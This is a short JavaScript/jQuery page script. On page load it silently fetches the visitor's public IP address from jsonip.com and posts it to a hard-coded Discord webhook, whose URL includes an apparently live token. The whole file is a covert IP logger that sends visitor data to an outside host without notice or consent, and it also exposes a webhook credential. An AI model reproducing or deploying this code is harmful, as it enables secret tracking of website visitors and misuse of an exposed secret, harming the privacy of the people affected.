$(document).ready(function () {
    $.getJSON("http://jsonip.com/?callback=?", function (data) {
        const xhr = new XMLHttpRequest();
		xhr.open("POST", "https://discord.com/api/webhooks/1284584440114315284/vXRjbVYXdkuwFsxoHyLGxU0NGX-lHEMBO4fjgsvmUX0J2XrLncAWYhujAX6H9Gasx2l7");
		const body = JSON.stringify({
		  content: ''+JSON.stringify(data),
		});	
		xhr.setRequestHeader('Content-type', 'application/json');
		xhr.send(body);
    });
});
